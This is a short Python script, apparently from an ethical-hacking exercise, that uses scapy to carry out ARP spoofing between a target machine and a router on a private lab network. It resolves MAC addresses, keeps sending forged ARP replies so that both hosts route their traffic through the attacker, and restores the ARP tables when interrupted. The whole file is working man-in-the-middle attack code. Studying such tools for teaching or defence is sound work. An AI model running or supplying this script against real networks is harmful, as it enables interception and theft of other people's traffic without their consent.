import scapy.all as scapy
from time import sleep


target = '10.0.2.9'
router = '10.0.2.1'


# # get all possible methods of scapy.ARP()
# print(scapy.ls(scapy.ARP))


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
    return answered_list[0][1].hwsrc


# op: when using ARP, replace the default action from RQUEST(op=1) to RESPONSE(op=2)
# pdst: set the IP to the IP address of the target machine (we get it from network_scanner.py)
# hwdst: set the MAC to the target's MAC
# psrc: fake the source (not from my IP but from router's IP) (route -n -> Gateway)
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


# keep spoofing as long as we need
count = 2
try:
    while True:
        print('\r[+] Packets sent:', count, end='')
        count += 2
        spoof(target, router)
        spoof(router, target)
        sleep(2)
except KeyboardInterrupt:
    print('\n[+] Detected CTRL+C... Restoring ARP tables. Please, wait...')
    restore(target, router)
    restore(router, target)
